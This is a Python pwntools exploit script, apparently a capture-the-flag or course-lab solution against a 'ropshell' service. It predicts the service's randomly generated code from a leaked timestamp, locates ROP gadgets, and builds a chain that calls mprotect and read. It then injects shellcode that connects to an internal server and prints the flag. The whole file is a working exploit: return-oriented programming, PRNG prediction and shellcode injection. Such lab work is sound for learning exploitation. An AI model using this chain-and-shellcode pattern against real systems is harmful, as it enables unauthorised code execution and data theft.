#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
import pwn
import ctypes

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
	r = pwn.process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
	r = pwn.process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
	r = pwn.remote("localhost", 10494)
else:
	r = pwn.remote("up23.zoolab.org", 10494)

if type(r) != pwn.pwnlib.tubes.process.process:
	pw.solve_pow(r)


s = r.recvuntil(b'** Timestamp is ');
print(s);
timestamp = int(r.recvline().decode()[:-1]);
print('\ntimestamp =', timestamp);
s = r.recvuntil(b'** Random bytes generated at ');
print(s);
addr = int(r.recvline().decode()[:-1], 16);
print('\naddr =', hex(addr));
s = r.recvuntil(b'second(s)\n');
print(s);
## ---

LEN_CODE = 10 * 0x10000;
LEN_STACK = 8192;

libc = ctypes.CDLL('libc.so.6');
libc.srand(timestamp);
codeint = (ctypes.c_uint32 * (LEN_CODE // 4))();
for i in range(LEN_CODE // 4):
	codeint[i] = (libc.rand() << 16) | (libc.rand() & 0xffff);
codeint[libc.rand() % (LEN_CODE // 4 - 1)] = 0xc3050f;
code = bytes(codeint);

leng = 0x1000;
pop_rdi_ret	= addr + leng + code[leng:].index(pwn.asm('pop rdi ; ret'));
pop_rsi_ret	= addr + leng + code[leng:].index(pwn.asm('pop rsi ; ret'));
pop_rdx_ret	= addr + leng + code[leng:].index(pwn.asm('pop rdx ; ret'));
pop_rax_ret	= addr + leng + code[leng:].index(pwn.asm('pop rax ; ret'));
syscall_ret	= addr + leng + code[leng:].index(pwn.asm('syscall ; ret'));

ROP = pwn.flat(
	pop_rdi_ret, addr,		# addr
	pop_rsi_ret, leng,		# len
	pop_rdx_ret, 7,			# prot
	pop_rax_ret, 10,		# mprotect
	syscall_ret,

	pop_rdi_ret, 0,			# fd
	pop_rsi_ret, addr,		# buf
	pop_rdx_ret, leng,		# count
	pop_rax_ret, 0,			# read
	syscall_ret,

	addr, # asm to be executed (with exit at the end)
);

## ---
ASM = '';

# [25 pts] You can show the FLAG read from the /FLAG file.

# [25 pts] You can show the FLAG stored in the shared memory. Note that you must remove all padded null (\0) bytes when displaying the FLAG.

# [25 pts] You can show the FLAG received from the internal network server.
ASM += pwn.shellcraft.connect('localhost', 0x1337);
ASM += pwn.shellcraft.read('rbp', addr + leng // 2, leng // 2);
ASM += pwn.shellcraft.write(1, addr + leng // 2, 'rax');

ASM += '''
mov rdi, 37 ;								# status
mov rax, 60 ;								# exit
syscall ;
''';
# ---

print(ASM);
ASM = pwn.asm(ASM);
print('len(ASM)=', len(ASM));
print('ASM=', ASM);

r.send(ROP);
s = r.recvuntil(b'bytes command received.\n');
print(s);

r.send(ASM + b'\x00' * (leng // 4 - len(ASM)));

s = r.recvline(); # flag 3
print(s.decode(), end='');

r.interactive();

